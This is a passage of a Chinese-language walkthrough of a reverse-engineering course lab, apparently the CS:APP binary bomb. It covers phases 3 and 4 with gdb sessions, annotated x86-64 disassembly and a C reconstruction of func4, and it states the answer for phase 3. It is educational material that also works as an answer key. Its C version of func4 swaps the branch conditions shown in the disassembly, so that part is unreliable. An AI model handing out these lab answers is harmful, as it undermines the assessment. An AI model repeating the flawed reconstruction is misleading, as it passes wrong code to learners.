<span class=normal><a href=#__codelineno-24-2>2</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-24-1><a id=__codelineno-24-1 name=__codelineno-24-1></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>x/s<span class=w> </span>0x4025cf
</span><span id=__span-24-2><a id=__codelineno-24-2 name=__codelineno-24-2></a>0x4025cf:<span class=w>       </span><span class=s2>"%d %d"</span>
</span></code></pre></div></td></tr></table></div> <p><code>int sscanf(const char *str, const char *format, ...);</code>用于从字符串中读取格式化的数据。它的名字来源于"string scanf"，是<code>scanf</code>函数的字符串版本。</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-25-1> 1</a></span>
<span class=normal><a href=#__codelineno-25-2> 2</a></span>
<span class=normal><a href=#__codelineno-25-3> 3</a></span>
<span class=normal><a href=#__codelineno-25-4> 4</a></span>
<span class=normal><a href=#__codelineno-25-5> 5</a></span>
<span class=normal><a href=#__codelineno-25-6> 6</a></span>
<span class=normal><a href=#__codelineno-25-7> 7</a></span>
<span class=normal><a href=#__codelineno-25-8> 8</a></span>
<span class=normal><a href=#__codelineno-25-9> 9</a></span>
<span class=normal><a href=#__codelineno-25-10>10</a></span>
<span class=normal><a href=#__codelineno-25-11>11</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-25-1><a id=__codelineno-25-1 name=__codelineno-25-1></a><span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;stdio.h&gt;</span>
</span><span id=__span-25-2><a id=__codelineno-25-2 name=__codelineno-25-2></a>
</span><span id=__span-25-3><a id=__codelineno-25-3 name=__codelineno-25-3></a><span class=kt>int</span><span class=w> </span><span class=nf>main</span><span class=p>()</span><span class=w> </span>
</span><span id=__span-25-4><a id=__codelineno-25-4 name=__codelineno-25-4></a><span class=p>{</span>
</span><span id=__span-25-5><a id=__codelineno-25-5 name=__codelineno-25-5></a><span class=w>    </span><span class=k>const</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>str</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>"123 456"</span><span class=p>;</span>
</span><span id=__span-25-6><a id=__codelineno-25-6 name=__codelineno-25-6></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>a</span><span class=p>,</span><span class=w> </span><span class=n>b</span><span class=p>;</span>
</span><span id=__span-25-7><a id=__codelineno-25-7 name=__codelineno-25-7></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>count</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>sscanf</span><span class=p>(</span><span class=n>str</span><span class=p>,</span><span class=w> </span><span class=s>"%d %d"</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>a</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>b</span><span class=p>);</span>
</span><span id=__span-25-8><a id=__codelineno-25-8 name=__codelineno-25-8></a><span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=s>"成功读取 %d 个参数: a=%d, b=%d</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>count</span><span class=p>,</span><span class=w> </span><span class=n>a</span><span class=p>,</span><span class=w> </span><span class=n>b</span><span class=p>);</span>
</span><span id=__span-25-9><a id=__codelineno-25-9 name=__codelineno-25-9></a><span class=w>    </span><span class=c1>// 输出: 成功读取 2 个参数: a=123, b=456</span>
</span><span id=__span-25-10><a id=__codelineno-25-10 name=__codelineno-25-10></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-25-11><a id=__codelineno-25-11 name=__codelineno-25-11></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p><code>jmp *0x402470(,%rax,8)</code> 指令解释: 这条指令是间接跳转指令，在汇编中用于实现 跳转表(jump table) 结构，常见于switch-case语句的汇编实现，计算目标地址 = 0x402470 + (%rax × 8) 然后跳转到该地址指向的内存位置继续执行，其中8是每个跳转表项的大小（在64位系统中，地址占8字节）。请注意，<code>mov $0xcf,%eax</code>等指令是在跳转表的各个分支中的，当程序执行到<code>jmp *0x402470(,%rax,8)</code>时，可以查看：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-26-1>1</a></span>
<span class=normal><a href=#__codelineno-26-2>2</a></span>
<span class=normal><a href=#__codelineno-26-3>3</a></span>
<span class=normal><a href=#__codelineno-26-4>4</a></span>
<span class=normal><a href=#__codelineno-26-5>5</a></span>
<span class=normal><a href=#__codelineno-26-6>6</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-26-1><a id=__codelineno-26-1 name=__codelineno-26-1></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>x<span class=w> </span>0x402470
</span><span id=__span-26-2><a id=__codelineno-26-2 name=__codelineno-26-2></a>0x402470:<span class=w>       </span>0x00400f7c
</span><span id=__span-26-3><a id=__codelineno-26-3 name=__codelineno-26-3></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>si
</span><span id=__span-26-4><a id=__codelineno-26-4 name=__codelineno-26-4></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>si
</span><span id=__span-26-5><a id=__codelineno-26-5 name=__codelineno-26-5></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>p<span class=w> </span><span class=nv>$eax</span>
</span><span id=__span-26-6><a id=__codelineno-26-6 name=__codelineno-26-6></a><span class=nv>$1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=m>207</span>
</span></code></pre></div></td></tr></table></div> <p><code>phase_3</code> 函数要求用户输入两个整数，其中：</p> <ul> <li>第一个整数必须是0-7之间的整数</li> <li>第二个整数必须与根据第一个整数通过跳转表确定的特定值相等</li> </ul> <p>要通过此阶段，用户需要找到与第一个输入值(0-7)对应的正确第二个值。例如：</p> <ul> <li>当第一个数为0时，第二个数应为207(0xcf)</li> <li>当第一个数为1时，第二个数应为707(0x2c3)</li> <li>以此类推...</li> </ul> <p>这些对应关系由跳转表中的各个分支决定，因此，正确的输入序列可以是：0 207。</p> </li> <li> <h3 id=phase-4>Phase 4<a class=headerlink href=#phase-4 title="Permanent link">¶</a></h3> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-27-1> 1</a></span>
<span class=normal><a href=#__codelineno-27-2> 2</a></span>
<span class=normal><a href=#__codelineno-27-3> 3</a></span>
<span class=normal><a href=#__codelineno-27-4> 4</a></span>
<span class=normal><a href=#__codelineno-27-5> 5</a></span>
<span class=normal><a href=#__codelineno-27-6> 6</a></span>
<span class=normal><a href=#__codelineno-27-7> 7</a></span>
<span class=normal><a href=#__codelineno-27-8> 8</a></span>
<span class=normal><a href=#__codelineno-27-9> 9</a></span>
<span class=normal><a href=#__codelineno-27-10>10</a></span>
<span class=normal><a href=#__codelineno-27-11>11</a></span>
<span class=normal><a href=#__codelineno-27-12>12</a></span>
<span class=normal><a href=#__codelineno-27-13>13</a></span>
<span class=normal><a href=#__codelineno-27-14>14</a></span>
<span class=normal><a href=#__codelineno-27-15>15</a></span>
<span class=normal><a href=#__codelineno-27-16>16</a></span>
<span class=normal><a href=#__codelineno-27-17>17</a></span>
<span class=normal><a href=#__codelineno-27-18>18</a></span>
<span class=normal><a href=#__codelineno-27-19>19</a></span>
<span class=normal><a href=#__codelineno-27-20>20</a></span>
<span class=normal><a href=#__codelineno-27-21>21</a></span>
<span class=normal><a href=#__codelineno-27-22>22</a></span>
<span class=normal><a href=#__codelineno-27-23>23</a></span>
<span class=normal><a href=#__codelineno-27-24>24</a></span>
<span class=normal><a href=#__codelineno-27-25>25</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-27-1><a id=__codelineno-27-1 name=__codelineno-27-1></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>disas
</span><span id=__span-27-2><a id=__codelineno-27-2 name=__codelineno-27-2></a>Dump<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>code<span class=w> </span><span class=k>for</span><span class=w> </span><span class=k>function</span><span class=w> </span>phase_4:
</span><span id=__span-27-3><a id=__codelineno-27-3 name=__codelineno-27-3></a><span class=o>=</span>&gt;<span class=w> </span>0x000000000040100c<span class=w> </span>&lt;+0&gt;:<span class=w>     </span>sub<span class=w>    </span><span class=nv>$0</span>x18,%rsp<span class=w>   </span><span class=c1># 分配24字节栈空间</span>
</span><span id=__span-27-4><a id=__codelineno-27-4 name=__codelineno-27-4></a>0x0000000000401010<span class=w> </span>&lt;+4&gt;:<span class=w>     </span>lea<span class=w>    </span>0xc<span class=o>(</span>%rsp<span class=o>)</span>,%rcx<span class=w>  </span><span class=c1># 第二个输入参数的地址</span>
</span><span id=__span-27-5><a id=__codelineno-27-5 name=__codelineno-27-5></a>0x0000000000401015<span class=w> </span>&lt;+9&gt;:<span class=w>     </span>lea<span class=w>    </span>0x8<span class=o>(</span>%rsp<span class=o>)</span>,%rdx<span class=w>  </span><span class=c1># 第一个输入参数的地址</span>
</span><span id=__span-27-6><a id=__codelineno-27-6 name=__codelineno-27-6></a>0x000000000040101a<span class=w> </span>&lt;+14&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x4025cf,%esi<span class=w>  </span><span class=c1># 格式化字符串地址</span>
</span><span id=__span-27-7><a id=__codelineno-27-7 name=__codelineno-27-7></a>0x000000000040101f<span class=w> </span>&lt;+19&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x0,%eax<span class=w>       </span><span class=c1># 初始化返回值为0</span>
</span><span id=__span-27-8><a id=__codelineno-27-8 name=__codelineno-27-8></a>0x0000000000401024<span class=w> </span>&lt;+24&gt;:<span class=w>    </span>call<span class=w>   </span>0x400bf0<span class=w> </span>&lt;__isoc99_sscanf@plt&gt;<span class=w> </span><span class=c1># 使用sscanf函数从用户输入中解析两个整数，分别存储在栈上的0x8(%rsp)和0xc(%rsp)位置</span>
</span><span id=__span-27-9><a id=__codelineno-27-9 name=__codelineno-27-9></a>0x0000000000401029<span class=w> </span>&lt;+29&gt;:<span class=w>    </span>cmp<span class=w>    </span><span class=nv>$0</span>x2,%eax<span class=w>               </span><span class=c1># 检查是否成功解析了2个整数</span>
</span><span id=__span-27-10><a id=__codelineno-27-10 name=__codelineno-27-10></a>0x000000000040102c<span class=w> </span>&lt;+32&gt;:<span class=w>    </span>jne<span class=w>    </span>0x401035<span class=w> </span>&lt;phase_4+41&gt;<span class=w>   </span><span class=c1># 解析失败则跳转</span>
</span><span id=__span-27-11><a id=__codelineno-27-11 name=__codelineno-27-11></a>0x000000000040102e<span class=w> </span>&lt;+34&gt;:<span class=w>    </span>cmpl<span class=w>   </span><span class=nv>$0</span>xe,0x8<span class=o>(</span>%rsp<span class=o>)</span><span class=w>          </span><span class=c1># 检查第一个输入是否≤14(0xe)</span>
</span><span id=__span-27-12><a id=__codelineno-27-12 name=__codelineno-27-12></a>0x0000000000401033<span class=w> </span>&lt;+39&gt;:<span class=w>    </span>jbe<span class=w>    </span>0x40103a<span class=w> </span>&lt;phase_4+46&gt;<span class=w>   </span><span class=c1># 输入有效则跳转</span>
</span><span id=__span-27-13><a id=__codelineno-27-13 name=__codelineno-27-13></a>0x0000000000401035<span class=w> </span>&lt;+41&gt;:<span class=w>    </span>call<span class=w>   </span>0x40143a<span class=w> </span>&lt;explode_bomb&gt;<span class=w> </span><span class=c1># 验证失败引爆炸弹</span>
</span><span id=__span-27-14><a id=__codelineno-27-14 name=__codelineno-27-14></a>0x000000000040103a<span class=w> </span>&lt;+46&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>xe,%edx<span class=w>       </span><span class=c1># 设置func4的第3个参数为14</span>
</span><span id=__span-27-15><a id=__codelineno-27-15 name=__codelineno-27-15></a>0x000000000040103f<span class=w> </span>&lt;+51&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x0,%esi<span class=w>       </span><span class=c1># 设置func4的第2个参数为0</span>
</span><span id=__span-27-16><a id=__codelineno-27-16 name=__codelineno-27-16></a>0x0000000000401044<span class=w> </span>&lt;+56&gt;:<span class=w>    </span>mov<span class=w>    </span>0x8<span class=o>(</span>%rsp<span class=o>)</span>,%edi<span class=w>  </span><span class=c1># 设置func4的第1个参数为用户第一个输入</span>
</span><span id=__span-27-17><a id=__codelineno-27-17 name=__codelineno-27-17></a>0x0000000000401048<span class=w> </span>&lt;+60&gt;:<span class=w>    </span>call<span class=w>   </span>0x400fce<span class=w> </span>&lt;func4&gt;
</span><span id=__span-27-18><a id=__codelineno-27-18 name=__codelineno-27-18></a>0x000000000040104d<span class=w> </span>&lt;+65&gt;:<span class=w>    </span><span class=nb>test</span><span class=w>   </span>%eax,%eax<span class=w>             </span><span class=c1># 检查func4返回值是否为0</span>
</span><span id=__span-27-19><a id=__codelineno-27-19 name=__codelineno-27-19></a>0x000000000040104f<span class=w> </span>&lt;+67&gt;:<span class=w>    </span>jne<span class=w>    </span>0x401058<span class=w> </span>&lt;phase_4+76&gt;<span class=w> </span><span class=c1># 不为0则引爆炸弹</span>
</span><span id=__span-27-20><a id=__codelineno-27-20 name=__codelineno-27-20></a>0x0000000000401051<span class=w> </span>&lt;+69&gt;:<span class=w>    </span>cmpl<span class=w>   </span><span class=nv>$0</span>x0,0xc<span class=o>(</span>%rsp<span class=o>)</span><span class=w>        </span><span class=c1># 检查用户第二个输入是否为0</span>
</span><span id=__span-27-21><a id=__codelineno-27-21 name=__codelineno-27-21></a>0x0000000000401056<span class=w> </span>&lt;+74&gt;:<span class=w>    </span>je<span class=w>     </span>0x40105d<span class=w> </span>&lt;phase_4+81&gt;<span class=w> </span><span class=c1># 为0则跳转</span>
</span><span id=__span-27-22><a id=__codelineno-27-22 name=__codelineno-27-22></a>0x0000000000401058<span class=w> </span>&lt;+76&gt;:<span class=w>    </span>call<span class=w>   </span>0x40143a<span class=w> </span>&lt;explode_bomb&gt;<span class=w> </span><span class=c1># 验证失败引爆炸弹</span>
</span><span id=__span-27-23><a id=__codelineno-27-23 name=__codelineno-27-23></a>0x000000000040105d<span class=w> </span>&lt;+81&gt;:<span class=w>    </span>add<span class=w>    </span><span class=nv>$0</span>x18,%rsp<span class=w> </span><span class=c1># 恢复栈指针</span>
</span><span id=__span-27-24><a id=__codelineno-27-24 name=__codelineno-27-24></a>0x0000000000401061<span class=w> </span>&lt;+85&gt;:<span class=w>    </span>ret<span class=w>               </span><span class=c1># 返回</span>
</span><span id=__span-27-25><a id=__codelineno-27-25 name=__codelineno-27-25></a>End<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>dump.
</span></code></pre></div></td></tr></table></div> <p>因此，<code>phase_4</code>函数的核心功能是，接收用户输入的两个整数：</p> <ul> <li>验证第一个整数的范围（必须在0-14之间），调用<code>func4</code>函数进行进一步计算，并验证其返回值必须为0</li> <li>验证第二个整数必须为0</li> </ul> <p><code>func4</code>的汇编代码是：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-28-1> 1</a></span>
<span class=normal><a href=#__codelineno-28-2> 2</a></span>
<span class=normal><a href=#__codelineno-28-3> 3</a></span>
<span class=normal><a href=#__codelineno-28-4> 4</a></span>
<span class=normal><a href=#__codelineno-28-5> 5</a></span>
<span class=normal><a href=#__codelineno-28-6> 6</a></span>
<span class=normal><a href=#__codelineno-28-7> 7</a></span>
<span class=normal><a href=#__codelineno-28-8> 8</a></span>
<span class=normal><a href=#__codelineno-28-9> 9</a></span>
<span class=normal><a href=#__codelineno-28-10>10</a></span>
<span class=normal><a href=#__codelineno-28-11>11</a></span>
<span class=normal><a href=#__codelineno-28-12>12</a></span>
<span class=normal><a href=#__codelineno-28-13>13</a></span>
<span class=normal><a href=#__codelineno-28-14>14</a></span>
<span class=normal><a href=#__codelineno-28-15>15</a></span>
<span class=normal><a href=#__codelineno-28-16>16</a></span>
<span class=normal><a href=#__codelineno-28-17>17</a></span>
<span class=normal><a href=#__codelineno-28-18>18</a></span>
<span class=normal><a href=#__codelineno-28-19>19</a></span>
<span class=normal><a href=#__codelineno-28-20>20</a></span>
<span class=normal><a href=#__codelineno-28-21>21</a></span>
<span class=normal><a href=#__codelineno-28-22>22</a></span>
<span class=normal><a href=#__codelineno-28-23>23</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-28-1><a id=__codelineno-28-1 name=__codelineno-28-1></a>0000000000400fce<span class=w> </span>&lt;func4&gt;:<span class=w>       </span><span class=c1># func4(int a, int b, int c)，其中 a 是用户输入，b 是第0，c 是14参数</span>
</span><span id=__span-28-2><a id=__codelineno-28-2 name=__codelineno-28-2></a>400fce:<span class=w> </span><span class=m>48</span><span class=w> </span><span class=m>83</span><span class=w> </span>ec<span class=w> </span><span class=m>08</span><span class=w>             </span>sub<span class=w>    </span><span class=nv>$0</span>x8,%rsp<span class=w>  </span><span class=c1># 分配8字节栈空间</span>
</span><span id=__span-28-3><a id=__codelineno-28-3 name=__codelineno-28-3></a>400fd2:<span class=w> </span><span class=m>89</span><span class=w> </span>d0<span class=w>                   </span>mov<span class=w>    </span>%edx,%eax<span class=w>  </span><span class=c1># eax = c</span>
</span><span id=__span-28-4><a id=__codelineno-28-4 name=__codelineno-28-4></a>400fd4:<span class=w> </span><span class=m>29</span><span class=w> </span>f0<span class=w>                   </span>sub<span class=w>    </span>%esi,%eax<span class=w>  </span><span class=c1># eax = c - b</span>
</span><span id=__span-28-5><a id=__codelineno-28-5 name=__codelineno-28-5></a>400fd6:<span class=w> </span><span class=m>89</span><span class=w> </span>c1<span class=w>                   </span>mov<span class=w>    </span>%eax,%ecx<span class=w>  </span><span class=c1># ecx = c - b</span>
</span><span id=__span-28-6><a id=__codelineno-28-6 name=__codelineno-28-6></a>400fd8:<span class=w> </span>c1<span class=w> </span>e9<span class=w> </span>1f<span class=w>                </span>shr<span class=w>    </span><span class=nv>$0</span>x1f,%ecx<span class=w> </span><span class=c1># ecx = (c - b) &gt;&gt; 31，算术右移31位，提取符号位，正数得到 0x00000000，负数得到 0xffffffff</span>
</span><span id=__span-28-7><a id=__codelineno-28-7 name=__codelineno-28-7></a>400fdb:<span class=w> </span><span class=m>01</span><span class=w> </span>c8<span class=w>                   </span>add<span class=w>    </span>%ecx,%eax<span class=w>  </span><span class=c1># 加上符号位（处理负数情况）</span>
</span><span id=__span-28-8><a id=__codelineno-28-8 name=__codelineno-28-8></a>400fdd:<span class=w> </span>d1<span class=w> </span>f8<span class=w>                   </span>sar<span class=w>    </span><span class=nv>$1</span>,%eax<span class=w>    </span><span class=c1># 算术右移1位，相当于除以2并向下取整</span>
</span><span id=__span-28-9><a id=__codelineno-28-9 name=__codelineno-28-9></a>400fdf:<span class=w> </span>8d<span class=w> </span>0c<span class=w> </span><span class=m>30</span><span class=w>                </span>lea<span class=w>    </span><span class=o>(</span>%rax,%rsi,1<span class=o>)</span>,%ecx<span class=w>  </span><span class=c1># ecx = b + (c - b) / 2（中点值）</span>
</span><span id=__span-28-10><a id=__codelineno-28-10 name=__codelineno-28-10></a>400fe2:<span class=w> </span><span class=m>39</span><span class=w> </span>f9<span class=w>                   </span>cmp<span class=w>    </span>%edi,%ecx<span class=w>           </span><span class=c1># 比较输入值与中点值</span>
</span><span id=__span-28-11><a id=__codelineno-28-11 name=__codelineno-28-11></a>400fe4:<span class=w> </span>7e<span class=w> </span>0c<span class=w>                   </span>jle<span class=w>    </span>400ff2<span class=w> </span>&lt;func4+0x24&gt;<span class=w> </span><span class=c1># 如果输入值&lt;=中点值，跳转 &lt;0x400ff2&gt;</span>
</span><span id=__span-28-12><a id=__codelineno-28-12 name=__codelineno-28-12></a>400fe6:<span class=w> </span>8d<span class=w> </span><span class=m>51</span><span class=w> </span>ff<span class=w>                </span>lea<span class=w>    </span>-0x1<span class=o>(</span>%rcx<span class=o>)</span>,%edx<span class=w>  </span><span class=c1># == 输入值 &gt; 中点值的情况 ==, 设置新的c = 中点值-1</span>
</span><span id=__span-28-13><a id=__codelineno-28-13 name=__codelineno-28-13></a>400fe9:<span class=w> </span>e8<span class=w> </span>e0<span class=w> </span>ff<span class=w> </span>ff<span class=w> </span>ff<span class=w>          </span>call<span class=w>   </span>400fce<span class=w> </span>&lt;func4&gt;<span class=w>      </span><span class=c1># 递归调用func4</span>
</span><span id=__span-28-14><a id=__codelineno-28-14 name=__codelineno-28-14></a>400fee:<span class=w> </span><span class=m>01</span><span class=w> </span>c0<span class=w>                   </span>add<span class=w>    </span>%eax,%eax<span class=w>           </span><span class=c1># 返回值 = 2 * 递归结果</span>
</span><span id=__span-28-15><a id=__codelineno-28-15 name=__codelineno-28-15></a>400ff0:<span class=w> </span>eb<span class=w> </span><span class=m>15</span><span class=w>                   </span>jmp<span class=w>    </span><span class=m>401007</span><span class=w> </span>&lt;func4+0x39&gt;<span class=w> </span><span class=c1># 跳转到函数返回部分 &lt;0x401007&gt;</span>
</span><span id=__span-28-16><a id=__codelineno-28-16 name=__codelineno-28-16></a>400ff2:<span class=w> </span>b8<span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>          </span>mov<span class=w>    </span><span class=nv>$0</span>x0,%eax<span class=w>           </span><span class=c1># == 输入值 &lt;= 中点值的情况 ==，先设置返回值为0</span>
</span><span id=__span-28-17><a id=__codelineno-28-17 name=__codelineno-28-17></a>400ff7:<span class=w> </span><span class=m>39</span><span class=w> </span>f9<span class=w>                   </span>cmp<span class=w>    </span>%edi,%ecx<span class=w>           </span><span class=c1># 再次比较输入值与中点值</span>
</span><span id=__span-28-18><a id=__codelineno-28-18 name=__codelineno-28-18></a>400ff9:<span class=w> </span>7d<span class=w> </span>0c<span class=w>                   </span>jge<span class=w>    </span><span class=m>401007</span><span class=w> </span>&lt;func4+0x39&gt;<span class=w> </span><span class=c1># 如果输入值&gt;=中点值，跳转到返回 &lt;0x401007&gt;</span>
</span><span id=__span-28-19><a id=__codelineno-28-19 name=__codelineno-28-19></a>400ffb:<span class=w> </span>8d<span class=w> </span><span class=m>71</span><span class=w> </span><span class=m>01</span><span class=w>                </span>lea<span class=w>    </span>0x1<span class=o>(</span>%rcx<span class=o>)</span>,%esi<span class=w>      </span><span class=c1># 设置新的b = 中点值+1</span>
</span><span id=__span-28-20><a id=__codelineno-28-20 name=__codelineno-28-20></a>400ffe:<span class=w> </span>e8<span class=w> </span>cb<span class=w> </span>ff<span class=w> </span>ff<span class=w> </span>ff<span class=w>          </span>call<span class=w>   </span>400fce<span class=w> </span>&lt;func4&gt;<span class=w>      </span><span class=c1># 递归调用func4</span>
</span><span id=__span-28-21><a id=__codelineno-28-21 name=__codelineno-28-21></a><span class=m>401003</span>:<span class=w> </span>8d<span class=w> </span><span class=m>44</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>01</span><span class=w>             </span>lea<span class=w>    </span>0x1<span class=o>(</span>%rax,%rax,1<span class=o>)</span>,%eax<span class=w> </span><span class=c1># 返回值 = 2 * 递归结果 + 1</span>
</span><span id=__span-28-22><a id=__codelineno-28-22 name=__codelineno-28-22></a><span class=m>401007</span>:<span class=w> </span><span class=m>48</span><span class=w> </span><span class=m>83</span><span class=w> </span>c4<span class=w> </span><span class=m>08</span><span class=w>             </span>add<span class=w>    </span><span class=nv>$0</span>x8,%rsp
</span><span id=__span-28-23><a id=__codelineno-28-23 name=__codelineno-28-23></a>40100b:<span class=w> </span>c3<span class=w>                      </span>ret
</span></code></pre></div></td></tr></table></div> <p>通过分析可以看出，<code>func4</code> 实现了一个基于二分查找的递归函数，其目标是找到一个特定的整数值：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-29-1> 1</a></span>
<span class=normal><a href=#__codelineno-29-2> 2</a></span>
<span class=normal><a href=#__codelineno-29-3> 3</a></span>
<span class=normal><a href=#__codelineno-29-4> 4</a></span>
<span class=normal><a href=#__codelineno-29-5> 5</a></span>
<span class=normal><a href=#__codelineno-29-6> 6</a></span>
<span class=normal><a href=#__codelineno-29-7> 7</a></span>
<span class=normal><a href=#__codelineno-29-8> 8</a></span>
<span class=normal><a href=#__codelineno-29-9> 9</a></span>
<span class=normal><a href=#__codelineno-29-10>10</a></span>
<span class=normal><a href=#__codelineno-29-11>11</a></span>
<span class=normal><a href=#__codelineno-29-12>12</a></span>
<span class=normal><a href=#__codelineno-29-13>13</a></span>
<span class=normal><a href=#__codelineno-29-14>14</a></span>
<span class=normal><a href=#__codelineno-29-15>15</a></span>
<span class=normal><a href=#__codelineno-29-16>16</a></span>
<span class=normal><a href=#__codelineno-29-17>17</a></span>
<span class=normal><a href=#__codelineno-29-18>18</a></span>
<span class=normal><a href=#__codelineno-29-19>19</a></span>
<span class=normal><a href=#__codelineno-29-20>20</a></span>
<span class=normal><a href=#__codelineno-29-21>21</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-29-1><a id=__codelineno-29-1 name=__codelineno-29-1></a><span class=kt>int</span><span class=w> </span><span class=nf>func4</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>x</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>low</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>high</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-29-2><a id=__codelineno-29-2 name=__codelineno-29-2></a><span class=p>{</span>
</span><span id=__span-29-3><a id=__codelineno-29-3 name=__codelineno-29-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>mid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>low</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=n>high</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>low</span><span class=p>)</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=mi>2</span><span class=p>;</span>
</span><span id=__span-29-4><a id=__codelineno-29-4 name=__codelineno-29-4></a>
</span><span id=__span-29-5><a id=__codelineno-29-5 name=__codelineno-29-5></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>x</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>mid</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-29-6><a id=__codelineno-29-6 name=__codelineno-29-6></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-29-7><a id=__codelineno-29-7 name=__codelineno-29-7></a><span class=w>        </span><span class=c1>// 输入值大于中点，递归搜索右半区间</span>
</span><span id=__span-29-8><a id=__codelineno-29-8 name=__codelineno-29-8></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>func4</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=w> </span><span class=n>low</span><span class=p>,</span><span class=w> </span><span class=n>mid</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=mi>1</span><span class=p>);</span>
</span><span id=__span-29-9><a id=__codelineno-29-9 name=__codelineno-29-9></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-29-10><a id=__codelineno-29-10 name=__codelineno-29-10></a><span class=w>    </span><span class=k>else</span><span class=w> </span>
</span><span id=__span-29-11><a id=__codelineno-29-11 name=__codelineno-29-11></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-29-12><a id=__codelineno-29-12 name=__codelineno-29-12></a><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-29-13><a id=__codelineno-29-13 name=__codelineno-29-13></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>x</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>mid</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-29-14><a id=__codelineno-29-14 name=__codelineno-29-14></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-29-15><a id=__codelineno-29-15 name=__codelineno-29-15></a><span class=w>            </span><span class=c1>// 输入值小于中点，递归搜索左半区间</span>
</span><span id=__span-29-16><a id=__codelineno-29-16 name=__codelineno-29-16></a><span class=w>            </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>func4</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=w> </span><span class=n>mid</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=n>high</span><span class=p>)</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
</span><span id=__span-29-17><a id=__codelineno-29-17 name=__codelineno-29-17></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-29-18><a id=__codelineno-29-18 name=__codelineno-29-18></a><span class=w>        </span><span class=c1>// 如果x等于mid，返回0</span>
</span><span id=__span-29-19><a id=__codelineno-29-19 name=__codelineno-29-19></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>result</span><span class=p>;</span>
</span><span id=__span-29-20><a id=__codelineno-29-20 name=__codelineno-29-20></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-29-21><a id=__codelineno-29-21 name=__codelineno-29-21></a><span class=p>}</span>
